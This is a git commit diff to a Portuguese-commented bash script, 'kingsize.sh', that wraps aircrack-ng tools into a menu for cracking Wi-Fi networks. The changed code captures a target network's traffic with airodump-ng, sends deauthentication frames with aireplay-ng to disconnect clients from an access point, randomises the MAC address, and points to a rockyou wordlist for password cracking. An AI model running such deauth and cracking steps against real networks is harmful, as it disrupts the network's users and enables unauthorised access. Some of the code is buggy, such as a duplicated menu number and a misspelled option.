bcda84fa4b1123189b0109ff762b04b94d5cb90b
root <root@localhost.localdomain>
2017-08-31 16:13:24 +0000

    resolvi algumas coisas, nao lembro o que

--- kingsize.sh
+++ kingsize.sh
@@ -19,14 +19,6 @@ DIR=`pwd`
 #ARQTMP=
 ARQ=teste
 
-
-
-#MENU
-
-# funçoes a serem criadas
-#public_ip
-#verificar_usuario
-
 function verificar_dependencias(){
 	if ! hash yad 2> /dev/null; then
 		echo "[ FALHA ] yad dialog nao instalado!"
@@ -38,10 +30,10 @@ function verificar_dependencias(){
 		exit 1
 	fi
 	
-	if ! hash xfce4-terminal 2> /dev/null; then
-		echo "[ FALHA ] xfce4-terminal nao instalado!"
-		exit 1	
-	fi
+	#if ! hash xfce4-terminal 2> /dev/null; then
+	#	echo "[ FALHA ] xfce4-terminal nao instalado!"
+	#	exit 1	
+	#fi
 
 	if ! hash reaver 2> /dev/null; then
 		echo "[ FALHA ] reaver nao instalado!"
@@ -75,51 +67,55 @@ fi
 
 }
 
-function escanear_todas_redes(){
+function varrer_todas_redes(){
 # Escanear todas redes encontradas pelo adaptador de rede sem fio. Caso contrario, emite um erro.
-(xterm -geometry 85x25 -title "Escaneando todas as redes" -e "airodump-ng wlan0mon" &) || \
-echo -e "[ FALHA ] Ocorreram erros!"
+(xterm -geometry 85x25 -title "Escaneando todas as redes sem fio alcancadas pela interface de monitoramento $INTERFACE_MON" \
+-e "airodump-ng wlan0mon" &) || \
+echo -e "[ FALHA ] Ocorreram erros em escanear todas as redes, verifique a interface $INTERFACE_MON esta ativa!"
 
 }
 
-
 function setar_parametros(){
-	PARAMETROS=$(yad --title "$TITLE" \
+	PARAMETROS=$(yad --title "Setar parametros" \
+	--text "(*) Campos obrigatorios                                      \n" \
 	--form \
-	--field "BSSID" "" \
-	--field "ESSID" "" \
-	--field "Channel" "" \
-	--field "Interface Mon" "wlan0mon" \
-	#--field "[ Wordlist ]":BTN "yad --file --maximized" \
-	--button ok \
+	--field "* BSSID" "" \
+	--field "* ESSID" "" \
+	--field "* Channel" "" \
+	--field "Client" "" \
+	--field "* Monitor" " wlan0mon" \
+	--field "* Wordlist" "~/king-size/wordlist/rockyou.txt" \
+	--button gtk-ok \
 	--button cancel \
-	--undecorated \
-	--center & )
+	--center &)
 
+	#--field "[ Wordlist ]":BTN "yad --file --maximized" \
+	
 	BSSID=$(echo "$PARAMETROS" | cut -d '|' -f 1)
 	ESSID=$(echo "$PARAMETROS" | cut -d '|' -f 2)
 	CHANNEL=$(echo "$PARAMETROS" | cut -d '|' -f 3)
-	INTERFACE_MON=$(echo "$PARAMETROS" | cut -d '|' -f 4)
-	#DIR=$(echo "$PARAMETROS" | cut -d '|' -f 5)
-	#ARQ=$(echo "$PARAMETROS" | cut -d '|' -f 5)
-
-	escanear_uma_rede
+	CLIENT=$(echo "$PARAMETROS" | cut -d '|' -f 4)
+	INTERFACE_MON=$(echo "$PARAMETROS" | cut -d '|' -f 5)
+	WORDLIST=$(echo "$PARAMETROS" | cut -d '|' -f 6)
+	#DIR=$(echo "$PARAMETROS" | cut -d '|' -f 7)
+	#ARQ=$(echo "$PARAMETROS" | cut -d '|' -f 8)
 }
 
-function escanear_uma_rede() {
+function varrer_uma_rede() {
+setar_parametros
 # Verifica se os 4 parametros obrigatorios para uso da função estão setados.
-if [ -z $BSSID  ] || [ -z $ESSID ] || [ -z $CHANNEL ] || [ -z INTERFACE_MON ] ; then
+if [ -z $BSSID  ] || [ -z $ESSID ] || [ -z $CHANNEL ] || [ -z $INTERFACE_MON ] ; then
 	echo "[ FALHA ] Falta parametros para o escaneamento da rede!"
 	exit 1
 fi
 
-(xterm -geometry 85x25 -title "Escaneando rede a rede sem fio: $ESSID" \ 
+(xterm -geometry 85x25 -title "Escaneando rede a sem fio $ESSID" \
 -e "airodump-ng --bssid $BSSID --essid $ESSID --channel $CHANNEL --write $DIR/$ARQ $INTERFACE_MON" &) || \
 echo -e "[ FALHA ] Ocorreram erros em escanear a rede sem fio: $ESSID"
 
 }
 
-function deauth_todos() {
+function deauth_todos_clientes() {
 # Envia 1 pacote de Desautenticação para todas as STA conectadas ao AP
 (xterm -geometry 85x25 -tilte "Enviando pacotes de desautenticação (Deauth) para todos as STA conectadas a rede sem fio: $ESSID" \
 -e  "aireplay-ng -0 1 -a $BSSID $INTERFACE_MON" &) || \
@@ -163,7 +159,7 @@ service networking restart
 }
 
 function alterar_mac() {
-	ifdown $INTERFACE &> /dev/null || echo "[ ok ] ifdown;
+	ifdown $INTERFACE &> /dev/null || echo "[ ok ] ifdown"
 	macchanger -r $INTERFACE &> /dev/null
 	ifup $INTERFACE &> /dev/null || echo "[ ok ] ifup"
 
@@ -179,47 +175,73 @@ return 0
 # precisa testar se o curl executou com sucesso
 #}
 
-
 #function infoap() {
 #Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' |$
 #Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | cut -d " " -f 5-`
 #echo
 #}
 
-function menu() {
+#function menu() {
+#while true; do
+#	MENU=$(yad --title "$TITLE" --list --text="\nKing Size Cracking\n" \
+#	--column=" :IMG" \
+#	--column="Opcao" \
+#	--column="Descricao" \
+#	--window-icon="gtk-connect" \
+#	--image gtk-index \
+#	--image-on-top \
+#	--maximized \
+#	--no-buttons \
+#	find "Monitor" "Ativar modo monitoramento" \
+#	find "Escanear" "Escanear todas redes alcancadas" \
+#	gtk-execute "Deauth" "Fazer desautenticacao dos hosts no AP" \
+#	gtk-execute "Injetar" "Injetar pacotes no AP" \
+#	gtk-quit "Sair" "Sair do script")
+#
+#	MENU=$(echo $MENU | cut -d "|" -f2)
+#
+#	case "$MENU" in
+#		"Monitor") iniciar_mon ;;
+#		"Escanear") varrer_todas_redes ;;
+#		"Deauth") deauth_todos ;;
+#		"Injetar") injetar ;;
+#		"Sair") encerrar_todos_processos; exit 0 ;;
+#	esac
+#done
+#}
+
+function menu(){
+
 while true; do
-	MENU=$(yad --title "$TITLE" --list --text="\nKing Size Cracking\n" \
-	--column=" :IMG" \
-	--column="Opcao" \
-	--column="Descricao" \
-	--window-icon="gtk-connect" \
-	--image gtk-index \
-	--image-on-top \
-	--maximized \
-	--no-buttons \
-	find "Monitor" "Ativar modo monitoramento" \
-	find "Escanear" "Escanear todas redes alcancadas" \
-	gtk-execute "Deauth" "Fazer desautenticacao dos hosts no AP" \
-	gtk-execute "Injetar" "Injetar pacotes no AP" \
-	gtk-quit "Sair" "Sair do script")
+cat << EOF
+1. Ativar a interface em modo monitoramento
+2. Varrer todas as redes sem fio alcancadas
+3. Varrer rede especifica
+4. Desautenticar todos as STA de um AP
+5. Desautenticar uma STA de um AP 
+6. Injetar pacotes em um AP
+6. Sair
 
-	MENU=$(echo $MENU | cut -d "|" -f2)
+EOF
+read -p "> " opt
 
-	case "$MENU" in
-		"Monitor") iniciar_mon ;;
-		"Escanear") varrer_todas_redes ;;
-		"Deauth") deauth_todos ;;
-		"Injetar") injetar ;;
-		"Sair") encerrar_todos_processos; exit 0 ;;
+	case "$opt" in
+		"1") iniciar_mon ;;
+		"2") varrer_todas_redes ;;
+		"3") varrer_uma_rede ;;
+		"4") deauth_todos_clientes ;;
+		"5") deauth_cliente_especifico ;;
+		"6") injetar ;;
+		"7") echo "Saindo"; matar_todos_processos; exit 0;;
+		"*") echo "Opcao invalida"; sleep 2;;
 	esac
 done
+
 }
 
 
 verificar_dependencias
 matar_processos_que_atrapalham_suite
+#matar_todos_processos; exit 1
 conf_interface
-iniciar_mon
-escanear_todas_redes
-setar_parametros
-#matar_todos_processos
+menu
